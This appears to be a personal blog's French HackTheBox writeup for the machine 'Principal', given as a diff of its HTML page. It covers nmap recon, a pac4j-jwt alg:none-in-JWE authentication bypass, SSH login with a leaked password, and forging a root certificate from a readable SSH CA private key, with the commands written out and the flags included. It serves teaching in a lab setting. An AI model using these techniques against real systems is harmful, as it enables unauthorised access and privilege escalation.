@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Principal - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Linux, Medium, Active Directory, FreeIPA">
+<meta name="description" content="OS: Linux | Difficulté: Medium | IP: 10.129.15.16
+Phase 1 - Reconnaissance &amp; Enumération Pourquoi on commence par là ? Toute attaque commence par comprendre la surface d&rsquo;attaque. On veut savoir quels ports sont ouverts et quels services tournent avant de chercher des vulnérabilités.
+Scan de ports nmap -p- --min-rate 5000 -sS 10.129.15.16 nmap -sCV -p 22,8080 10.129.15.16 Résultats :
+Port 22 - OpenSSH Port 8080 - Serveur HTTP Réflexion : Seulement 2 ports.">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/principal/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/principal/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="Principal - HackTheBox Writeup" />
+<meta property="og:description" content="OS: Linux | Difficulté: Medium | IP: 10.129.15.16
+Phase 1 - Reconnaissance &amp; Enumération Pourquoi on commence par là ? Toute attaque commence par comprendre la surface d&rsquo;attaque. On veut savoir quels ports sont ouverts et quels services tournent avant de chercher des vulnérabilités.
+Scan de ports nmap -p- --min-rate 5000 -sS 10.129.15.16 nmap -sCV -p 22,8080 10.129.15.16 Résultats :
+Port 22 - OpenSSH Port 8080 - Serveur HTTP Réflexion : Seulement 2 ports." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/principal/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Principal - HackTheBox Writeup"/>
+<meta name="twitter:description" content="OS: Linux | Difficulté: Medium | IP: 10.129.15.16
+Phase 1 - Reconnaissance &amp; Enumération Pourquoi on commence par là ? Toute attaque commence par comprendre la surface d&rsquo;attaque. On veut savoir quels ports sont ouverts et quels services tournent avant de chercher des vulnérabilités.
+Scan de ports nmap -p- --min-rate 5000 -sS 10.129.15.16 nmap -sCV -p 22,8080 10.129.15.16 Résultats :
+Port 22 - OpenSSH Port 8080 - Serveur HTTP Réflexion : Seulement 2 ports."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Principal - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/principal/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Principal - HackTheBox Writeup",
+  "name": "Principal - HackTheBox Writeup",
+  "description": "OS: Linux | Difficulté: Medium | IP: 10.129.15.16\nPhase 1 - Reconnaissance \u0026amp; Enumération Pourquoi on commence par là ? Toute attaque commence par comprendre la surface d\u0026rsquo;attaque. On veut savoir quels ports sont ouverts et quels services tournent avant de chercher des vulnérabilités.\nScan de ports nmap -p- --min-rate 5000 -sS 10.129.15.16 nmap -sCV -p 22,8080 10.129.15.16 Résultats :\nPort 22 - OpenSSH Port 8080 - Serveur HTTP Réflexion : Seulement 2 ports.",
+  "keywords": [
+    "HTB", "Linux", "Medium", "Active Directory", "FreeIPA"
+  ],
+  "articleBody": " OS: Linux | Difficulté: Medium | IP: 10.129.15.16\nPhase 1 - Reconnaissance \u0026 Enumération Pourquoi on commence par là ? Toute attaque commence par comprendre la surface d’attaque. On veut savoir quels ports sont ouverts et quels services tournent avant de chercher des vulnérabilités.\nScan de ports nmap -p- --min-rate 5000 -sS 10.129.15.16 nmap -sCV -p 22,8080 10.129.15.16 Résultats :\nPort 22 - OpenSSH Port 8080 - Serveur HTTP Réflexion : Seulement 2 ports. SSH sans credentials ne mène nulle part pour l’instant. On se concentre sur le port 8080 - c’est notre surface d’attaque principale.\nPhase 2 - Enumération Web Pourquoi explorer le web en détail ? Le port 8080 héberge une application web. Avant de chercher des vulnérabilités, on doit comprendre :\nQuelles technologies sont utilisées (pour chercher des CVE connues) Quels endpoints existent (pour trouver des fonctionnalités cachées) Comment l’authentification fonctionne (pour identifier des faiblesses) Première visite : la page de login curl -s http://10.129.15.16:8080/login On tombe sur un formulaire de login “Principal Internal Platform”. En interceptant la requête avec Burp ou en lisant le HTML, on voit que le login fait un POST vers /api/auth/login avec du JSON.\nLe header qui change tout curl -sI http://10.129.15.16:8080/api/auth/login Server: Jetty X-Powered-By: pac4j-jwt/6.0.3 Pourquoi c’est important ? Le header X-Powered-By nous révèle la technologie exacte ET sa version : pac4j-jwt 6.0.3. C’est une information critique - on peut maintenant chercher des CVE spécifiques à cette version.\nLe reset password - impasse volontaire POST /reset-password → 501 Not Implemented {\"message\":\"Password reset functionality is under development.\"} Réflexion : Le reset ne fonctionne pas. C’est un cul-de-sac. On ne perd pas de temps dessus et on cherche ailleurs.\nLe fichier JavaScript : la mine d’or curl -s http://10.129.15.16:8080/static/js/app.js Pourquoi lire le JS ? Les fichiers JavaScript côté client contiennent souvent :\nLes routes de l’API (endpoints cachés) La logique d’authentification Des commentaires de développeurs avec des infos sensibles Et ici c’est le jackpot. Le code source app.js nous révèle :\nLes endpoints de l’API :\n/api/auth/jwks - endpoint JWKS (clés publiques) /api/auth/login - authentification /api/dashboard - tableau de bord /api/users - gestion des utilisateurs (admin only) /api/settings - paramètres système (admin only) Le mécanisme d’authentification :\n// Token handling: // - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM // - Public key available at /api/auth/jwks for token verification // - Inner JWT is signed with RS256 Les rôles : ROLE_ADMIN, ROLE_MANAGER, ROLE_USER\nLe claim schema : sub (username), role, iss (“principal-platform”), iat, exp\nPoint crucial : La fonction fetchJWKS() appelle /api/auth/jwks sans aucun header d’authentification - la clé publique est accessible à tous !\nRéflexion : On sait maintenant exactement comment les tokens sont construits (JWE wrapping un JWT signé RS256), quels claims sont attendus, et on a accès à la clé publique. C’est le schéma classique d’une attaque JWT.\nRécupération de la clé publique RSA curl -s http://10.129.15.16:8080/api/auth/jwks {\"keys\":[{\"kty\":\"RSA\",\"e\":\"AQAB\",\"kid\":\"enc-key-1\",\"n\":\"lTh54vtBS1NA...\"}]} On a maintenant tous les ingrédients : la version exacte de pac4j, le format des tokens, les claims attendus, et la clé publique RSA.\nPhase 3 - Exploitation : CVE-2026-29000 (JWT Authentication Bypass) Pourquoi cette CVE ? En cherchant “pac4j-jwt 6.0.3 CVE” on trouve CVE-2026-29000 (CVSS 9.3 - CRITICAL).\nVersions affectées : pac4j-jwt 6.0 à 6.3.2. Notre cible (6.0.3) est vulnérable.\nComprendre la vulnérabilité Pour comprendre l’exploit, il faut d’abord comprendre comment fonctionne l’authentification JWT normale sur cette app :\n[Client] → envoie credentials → [Serveur] [Serveur] → crée un JWT signé (RS256) → le chiffre dans un JWE (RSA-OAEP-256) → renvoie au client [Client] → envoie le JWE comme Bearer token → [Serveur] [Serveur] → déchiffre le JWE → vérifie la signature du JWT intérieur → autorise Le bug dans pac4j : Quand le serveur déchiffre le JWE, il appelle toSignedJWT() sur le contenu intérieur pour vérifier la signature. MAIS si le contenu intérieur est un PlainJWT (un JWT avec \"alg\": \"none\" - donc sans signature), toSignedJWT() retourne null. Et quand c’est null, le code saute entièrement le bloc de vérification de signature au lieu de rejeter le token.\nEn résumé :\nJWT normal: JWE → [JWT signé RS256] → toSignedJWT() → vérifie signature ✓ Notre token: JWE → [PlainJWT alg:none] → toSignedJWT() → null → SKIP vérification ! L’exploitation pas à pas Étape 1 : Construire un PlainJWT (alg:none)\nOn crée un JWT sans signature avec les claims qu’on veut :\nHeader: {\"alg\": \"none\", \"typ\": \"JWT\"} Payload: {\"sub\": \"admin\", \"role\": \"ROLE_ADMIN\", \"iss\": \"principal-platform\", \"iat\": ..., \"exp\": ...} Le PlainJWT = base64url(header).base64url(payload). (pas de signature, juste un point final)\nPourquoi ces claims ? On les a trouvés dans app.js. On se fait passer pour admin avec le rôle ROLE_ADMIN pour avoir accès à tout.\nÉtape 2 : Wrapper dans un JWE\nOn ne peut pas envoyer le PlainJWT directement - le serveur attend un JWE. On chiffre notre PlainJWT avec la clé publique RSA récupérée via /api/auth/jwks :\nAlgorithme: RSA-OAEP-256 (trouvé dans app.js) Encryption: A128GCM (trouvé dans app.js) Content-Type: JWT (indique que le contenu est un JWT) Pourquoi ça marche ? Le serveur peut déchiffrer le JWE car on utilise sa clé publique pour chiffrer (il a la clé privée correspondante). Le chiffrement est légitime - c’est la vérification de signature qui est bypassée.\nÉtape 3 : Envoyer le token forgé\npython3 exploit_cve2026_29000.py Le script :\nFetch la clé publique depuis /api/auth/jwks Forge le PlainJWT avec claims admin Le wrappe dans un JWE L’envoie comme Authorization: Bearer Résultat : STATUS 200 - ACCESS GRANTED en tant qu’admin !\nCe qu’on extrait en tant qu’admin /api/dashboard - Le tableau de bord nous montre :\nL’activité récente : on voit un compte svc-deploy qui a des certificats SSH émis 8 utilisateurs dans le système /api/users - La liste complète des utilisateurs avec emails, rôles, départements :\nsvc-deploy : “Service account for automated deployments via SSH certificate auth” → compte de service intéressant /api/settings - Les paramètres système. C’est ici qu’on trouve le graal :\n{ \"security\": { \"encryptionKey\": \"D3pl0y_$$H_Now42!\", ... }, \"infrastructure\": { \"sshCertAuth\": \"enabled\", \"sshCaPath\": \"/opt/principal/ssh/\" } } Pourquoi c’est critique ?\nencryptionKey: D3pl0y_$$H_Now42! → potentiel mot de passe réutilisé sshCertAuth: enabled + sshCaPath → l’app gère des certificats SSH, ce sera utile pour le privesc Phase 4 - User Flag : Pivot vers SSH Pourquoi tester ce password en SSH ? La clé D3pl0y_$$H_Now42! ressemble plus à un mot de passe qu’à une vraie clé de chiffrement (pas assez d’entropie). Et on a vu que svc-deploy est un compte de service lié au déploiement SSH. Le réflexe : tester le password spray sur SSH avec tous les utilisateurs trouvés.\n# On teste chaque utilisateur sshpass -f /tmp/.sshpw ssh svc-deploy@10.129.15.16 'id' Résultat : svc-deploy accepte le password !\nuid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers) Observation clé : Le user est dans le groupe deployers. On note ça pour plus tard.\nUser Flag cat /home/svc-deploy/user.txt # 805571983436fcbd5c3b268cfde3d8dd Phase 5 - Privilege Escalation : SSH CA Key Abuse Pourquoi chercher vers le SSH CA ? On a plusieurs indices qui convergent :\n/api/settings nous dit que le SSH cert auth est activé, CA dans /opt/principal/ssh/ Le dashboard montre que svc-deploy a eu des “SSH certificate issued” svc-deploy est dans le groupe deployers La note du user dit “Service account for automated deployments via SSH certificate auth” Tout pointe vers le même endroit. On va vérifier si on a accès aux fichiers CA.\nExploration du répertoire SSH CA ls -la /opt/principal/ssh/ drwxr-x--- 2 root deployers 4096 Mar 11 04:22 . -rw-r----- 1 root deployers 3381 Mar 5 21:05 ca ← CLÉ PRIVÉE ! -rw-r--r-- 1 root root 742 Mar 5 21:05 ca.pub ← clé publique -rw-r----- 1 root deployers 288 Mar 5 21:05 README.txt Pourquoi c’est game over ?\nLe dossier appartient au groupe deployers → notre user svc-deploy est dans ce groupe La clé privée CA (ca) est lisible par le groupe deployers Avec la clé privée CA, on peut signer des certificats SSH pour N’IMPORTE QUEL utilisateur Vérification : est-ce que sshd fait confiance à cette CA ? cat /etc/ssh/sshd_config.d/*.conf TrustedUserCAKeys /opt/principal/ssh/ca.pub PermitRootLogin prohibit-password Deux confirmations critiques :\nTrustedUserCAKeys → sshd fait confiance aux certificats signés par cette CA PermitRootLogin prohibit-password → root peut se connecter en SSH mais UNIQUEMENT avec une clé/certificat (pas de password). Un certificat signé par la CA sera accepté ! Forger un certificat SSH pour root Étape 1 : Copier la clé privée CA sur notre machine\nscp svc-deploy@10.129.15.16:/opt/principal/ssh/ca /tmp/ca_key chmod 600 /tmp/ca_key Étape 2 : Générer une nouvelle paire de clés SSH\nssh-keygen -t ed25519 -f /tmp/root_key -N '' On crée une simple paire de clés ED25519. La clé en elle-même n’est pas importante - c’est le certificat signé par la CA qui donnera l’accès.\nÉtape 3 : Signer notre clé publique avec la CA pour le principal “root”\nssh-keygen -s /tmp/ca_key -I \"root-cert\" -n root -V +1h /tmp/root_key.pub Paramètres :\n-s /tmp/ca_key : utilise la clé privée CA pour signer -I \"root-cert\" : identifiant du certificat (arbitraire) -n root : le principal = le nom d’utilisateur autorisé. C’est ça qui dit “ce certificat est valide pour se connecter en tant que root” -V +1h : validité d'1 heure Cela crée /tmp/root_key-cert.pub - notre certificat forgé.\nÉtape 4 : Connexion en root\nssh -i /tmp/root_key root@10.129.15.16 Quand SSH se connecte, il envoie automatiquement le certificat (root_key-cert.pub) avec la clé. Le serveur :\nVérifie que le certificat est signé par la CA de confiance (TrustedUserCAKeys) → OUI Vérifie que le principal “root” correspond au user demandé → OUI Vérifie que le certificat n’est pas expiré → OUI Autorise la connexion → ROOT ! Root Flag cat /root/root.txt # 008970f511f940c5ddd416e392a050d7 Kill Chain Visuel ┌─────────────────────┐ │ Enumération │ │ nmap → SSH + 8080 │ └──────────┬──────────┘ │ ┌──────────▼──────────┐ │ Enum Web (8080) │ │ X-Powered-By: │ │ pac4j-jwt/6.0.3 │ │ + app.js → specs JWT │ │ + /api/auth/jwks │ └──────────┬──────────┘ │ ┌──────────▼──────────┐ │ CVE-2026-29000 │ │ Forge PlainJWT │ │ (alg:none) in JWE │ │ → Admin API access │ └──────────┬──────────┘ │ ┌──────────▼──────────┐ │ /api/settings │ │ Leak password: │ │ D3pl0y_$$H_Now42! │ └──────────┬──────────┘ │ ┌──────────▼──────────┐ │ SSH as svc-deploy │ │ → USER FLAG │ │ groupe: deployers │ └──────────┬──────────┘ │ ┌──────────▼──────────┐ │ /opt/principal/ssh/ │ │ CA private key │ │ lisible (deployers) │ └──────────┬──────────┘ │ ┌──────────▼──────────┐ │ Forge SSH cert │ │ pour root │ │ ssh -i root_key │ │ → ROOT FLAG │ └─────────────────────┘ Leçons apprises Toujours lire les fichiers JS - app.js nous a donné toute la spec d’authentification, les endpoints cachés, et les rôles. Sans ça, on aurait cherché à l’aveugle.\nLes headers HTTP parlent - X-Powered-By: pac4j-jwt/6.0.3 a directement mené à la CVE. Toujours noter les versions.\nLes settings API leakent souvent des secrets - Une fois admin, explorer /api/settings, /api/config, /admin/ etc. Les devs y mettent des infos qu’ils ne pensent pas exposées.\nPassword reuse - Une “encryption key” dans les settings s’est avérée être un password SSH. Toujours tester les secrets trouvés comme credentials.\nSSH CA = game over si la clé privée fuit - Quand TrustedUserCAKeys est configuré et qu’on a la clé privée CA, on peut se connecter en tant que N’IMPORTE QUEL utilisateur, y compris root. C’est pourquoi les clés CA doivent être extrêmement protégées.\nLes groupes Linux sont des vecteurs de privesc - svc-deploy dans le groupe deployers avait accès à la CA. Toujours vérifier id et les permissions des dossiers sensibles.\nFlags User: 805571983436fcbd5c3b268cfde3d8dd Root: 008970f511f940c5ddd416e392a050d7 ",
+  "wordCount" : "1889",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/principal/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Principal - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#phase-1---reconnaissance--enum%c3%a9ration" aria-label="Phase 1 - Reconnaissance &amp; Enumération">Phase 1 - Reconnaissance &amp; Enumération</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-on-commence-par-l%c3%a0-" aria-label="Pourquoi on commence par là ?">Pourquoi on commence par là ?</a></li>
+                <li>
+                    <a href="#scan-de-ports" aria-label="Scan de ports">Scan de ports</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-2---enum%c3%a9ration-web" aria-label="Phase 2 - Enumération Web">Phase 2 - Enumération Web</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-explorer-le-web-en-d%c3%a9tail-" aria-label="Pourquoi explorer le web en détail ?">Pourquoi explorer le web en détail ?</a></li>
+                <li>
+                    <a href="#premi%c3%a8re-visite--la-page-de-login" aria-label="Première visite : la page de login">Première visite : la page de login</a></li>
+                <li>
+                    <a href="#le-header-qui-change-tout" aria-label="Le header qui change tout">Le header qui change tout</a></li>
+                <li>
+                    <a href="#le-reset-password---impasse-volontaire" aria-label="Le reset password - impasse volontaire">Le reset password - impasse volontaire</a></li>
+                <li>
+                    <a href="#le-fichier-javascript--la-mine-dor" aria-label="Le fichier JavaScript : la mine d&rsquo;or">Le fichier JavaScript : la mine d&rsquo;or</a></li>
+                <li>
+                    <a href="#r%c3%a9cup%c3%a9ration-de-la-cl%c3%a9-publique-rsa" aria-label="Récupération de la clé publique RSA">Récupération de la clé publique RSA</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-3---exploitation--cve-2026-29000-jwt-authentication-bypass" aria-label="Phase 3 - Exploitation : CVE-2026-29000 (JWT Authentication Bypass)">Phase 3 - Exploitation : CVE-2026-29000 (JWT Authentication Bypass)</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-cette-cve-" aria-label="Pourquoi cette CVE ?">Pourquoi cette CVE ?</a></li>
+                <li>
+                    <a href="#comprendre-la-vuln%c3%a9rabilit%c3%a9" aria-label="Comprendre la vulnérabilité">Comprendre la vulnérabilité</a></li>
+                <li>
+                    <a href="#lexploitation-pas-%c3%a0-pas" aria-label="L&rsquo;exploitation pas à pas">L&rsquo;exploitation pas à pas</a></li>
+                <li>
+                    <a href="#ce-quon-extrait-en-tant-quadmin" aria-label="Ce qu&rsquo;on extrait en tant qu&rsquo;admin">Ce qu&rsquo;on extrait en tant qu&rsquo;admin</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-4---user-flag--pivot-vers-ssh" aria-label="Phase 4 - User Flag : Pivot vers SSH">Phase 4 - User Flag : Pivot vers SSH</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-tester-ce-password-en-ssh-" aria-label="Pourquoi tester ce password en SSH ?">Pourquoi tester ce password en SSH ?</a></li>
+                <li>
+                    <a href="#user-flag" aria-label="User Flag">User Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-5---privilege-escalation--ssh-ca-key-abuse" aria-label="Phase 5 - Privilege Escalation : SSH CA Key Abuse">Phase 5 - Privilege Escalation : SSH CA Key Abuse</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-chercher-vers-le-ssh-ca-" aria-label="Pourquoi chercher vers le SSH CA ?">Pourquoi chercher vers le SSH CA ?</a></li>
+                <li>
+                    <a href="#exploration-du-r%c3%a9pertoire-ssh-ca" aria-label="Exploration du répertoire SSH CA">Exploration du répertoire SSH CA</a></li>
+                <li>
+                    <a href="#v%c3%a9rification--est-ce-que-sshd-fait-confiance-%c3%a0-cette-ca-" aria-label="Vérification : est-ce que sshd fait confiance à cette CA ?">Vérification : est-ce que sshd fait confiance à cette CA ?</a></li>
+                <li>
+                    <a href="#forger-un-certificat-ssh-pour-root" aria-label="Forger un certificat SSH pour root">Forger un certificat SSH pour root</a></li>
+                <li>
+                    <a href="#root-flag" aria-label="Root Flag">Root Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#kill-chain-visuel" aria-label="Kill Chain Visuel">Kill Chain Visuel</a></li>
+                <li>
+                    <a href="#le%c3%a7ons-apprises" aria-label="Leçons apprises">Leçons apprises</a></li>
+                <li>
+                    <a href="#flags" aria-label="Flags">Flags</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p><strong>OS:</strong> Linux | <strong>Difficulté:</strong> Medium | <strong>IP:</strong> 10.129.15.16</p>
+</blockquote>
+<hr>
+<h2 id="phase-1---reconnaissance--enumération">Phase 1 - Reconnaissance &amp; Enumération<a hidden class="anchor" aria-hidden="true" href="#phase-1---reconnaissance--enumération">#</a></h2>
+<h3 id="pourquoi-on-commence-par-là-">Pourquoi on commence par là ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-on-commence-par-là-">#</a></h3>
+<p>Toute attaque commence par comprendre la surface d&rsquo;attaque. On veut savoir quels ports sont ouverts et quels services tournent avant de chercher des vulnérabilités.</p>
+<h3 id="scan-de-ports">Scan de ports<a hidden class="anchor" aria-hidden="true" href="#scan-de-ports">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">5000</span> -sS 10.129.15.16
+</span></span><span style="display:flex;"><span>nmap -sCV -p 22,8080 10.129.15.16
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<ul>
+<li><strong>Port 22</strong> - OpenSSH</li>
+<li><strong>Port 8080</strong> - Serveur HTTP</li>
+</ul>
+<p><strong>Réflexion :</strong> Seulement 2 ports. SSH sans credentials ne mène nulle part pour l&rsquo;instant. On se concentre sur le port 8080 - c&rsquo;est notre surface d&rsquo;attaque principale.</p>
+<hr>
+<h2 id="phase-2---enumération-web">Phase 2 - Enumération Web<a hidden class="anchor" aria-hidden="true" href="#phase-2---enumération-web">#</a></h2>
+<h3 id="pourquoi-explorer-le-web-en-détail-">Pourquoi explorer le web en détail ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-explorer-le-web-en-détail-">#</a></h3>
+<p>Le port 8080 héberge une application web. Avant de chercher des vulnérabilités, on doit comprendre :</p>
+<ul>
+<li>Quelles technologies sont utilisées (pour chercher des CVE connues)</li>
+<li>Quels endpoints existent (pour trouver des fonctionnalités cachées)</li>
+<li>Comment l&rsquo;authentification fonctionne (pour identifier des faiblesses)</li>
+</ul>
+<h3 id="première-visite--la-page-de-login">Première visite : la page de login<a hidden class="anchor" aria-hidden="true" href="#première-visite--la-page-de-login">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s http://10.129.15.16:8080/login
+</span></span></code></pre></div><p>On tombe sur un formulaire de login &ldquo;Principal Internal Platform&rdquo;. En interceptant la requête avec Burp ou en lisant le HTML, on voit que le login fait un POST vers <code>/api/auth/login</code> avec du JSON.</p>
+<h3 id="le-header-qui-change-tout">Le header qui change tout<a hidden class="anchor" aria-hidden="true" href="#le-header-qui-change-tout">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -sI http://10.129.15.16:8080/api/auth/login
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Server: Jetty
+</span></span><span style="display:flex;"><span>X-Powered-By: pac4j-jwt/6.0.3
+</span></span></code></pre></div><p><strong>Pourquoi c&rsquo;est important ?</strong> Le header <code>X-Powered-By</code> nous révèle la technologie exacte ET sa version : <strong>pac4j-jwt 6.0.3</strong>. C&rsquo;est une information critique - on peut maintenant chercher des CVE spécifiques à cette version.</p>
+<h3 id="le-reset-password---impasse-volontaire">Le reset password - impasse volontaire<a hidden class="anchor" aria-hidden="true" href="#le-reset-password---impasse-volontaire">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST /reset-password → 501 Not Implemented
+</span></span><span style="display:flex;"><span>{&#34;message&#34;:&#34;Password reset functionality is under development.&#34;}
+</span></span></code></pre></div><p><strong>Réflexion :</strong> Le reset ne fonctionne pas. C&rsquo;est un cul-de-sac. On ne perd pas de temps dessus et on cherche ailleurs.</p>
+<h3 id="le-fichier-javascript--la-mine-dor">Le fichier JavaScript : la mine d&rsquo;or<a hidden class="anchor" aria-hidden="true" href="#le-fichier-javascript--la-mine-dor">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s http://10.129.15.16:8080/static/js/app.js
+</span></span></code></pre></div><p><strong>Pourquoi lire le JS ?</strong> Les fichiers JavaScript côté client contiennent souvent :</p>
+<ul>
+<li>Les routes de l&rsquo;API (endpoints cachés)</li>
+<li>La logique d&rsquo;authentification</li>
+<li>Des commentaires de développeurs avec des infos sensibles</li>
+</ul>
+<p>Et ici c&rsquo;est le jackpot. Le code source <code>app.js</code> nous révèle :</p>
+<ol>
+<li>
+<p><strong>Les endpoints de l&rsquo;API :</strong></p>
+<ul>
+<li><code>/api/auth/jwks</code> - endpoint JWKS (clés publiques)</li>
+<li><code>/api/auth/login</code> - authentification</li>
+<li><code>/api/dashboard</code> - tableau de bord</li>
+<li><code>/api/users</code> - gestion des utilisateurs (admin only)</li>
+<li><code>/api/settings</code> - paramètres système (admin only)</li>
+</ul>
+</li>
+<li>
+<p><strong>Le mécanisme d&rsquo;authentification :</strong></p>
